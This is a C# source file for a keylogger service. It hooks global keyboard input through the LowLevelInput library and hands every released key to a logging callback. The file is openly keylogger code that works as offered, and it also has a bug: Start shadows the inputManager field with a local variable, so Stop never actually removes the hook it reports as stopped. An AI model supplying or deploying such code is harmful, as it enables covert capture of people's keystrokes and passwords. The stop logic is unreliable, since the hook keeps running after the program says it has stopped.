using KeyLogger.Interfaces;
using LowLevelInput.Converters;
using LowLevelInput.Hooks;

namespace KeyLogger.Services
{
    /// <summary>
    /// Start the keylogger in a background thread
    /// </summary>
    public class KeyLoggerService : IKeyLoggerService
    {
        private bool _isRunning;
        private InputManager inputManager;
        
        // Delegate to log string
        public delegate void LogHandler(string text);
        private LogHandler? _logHandler;


        public KeyLoggerService()
        {
            _isRunning = false;
            _logHandler = null;
        }

        public void Start(LogHandler logHandler)
        {
            _logHandler = logHandler;
            _isRunning = true;
            var inputManager = new InputManager();

            // subscribe to the events offered by InputManager
            inputManager.OnKeyboardEvent += ((KeyLogger, state) =>
            {
                if (state == KeyState.Up)
                {
                    _logHandler?.Invoke(KeyCodeConverter.ToString(KeyLogger));
                }
            });

            // we need to initialize our classes before they fire events and are completely usable
            inputManager.Initialize();
        }

        public void Stop()
        {
            _isRunning = false;
            inputManager?.Terminate();
            Console.WriteLine("Keylogger stopped");
            inputManager?.Dispose();
            Console.WriteLine("Keylogger disposed");
        }
    }
}
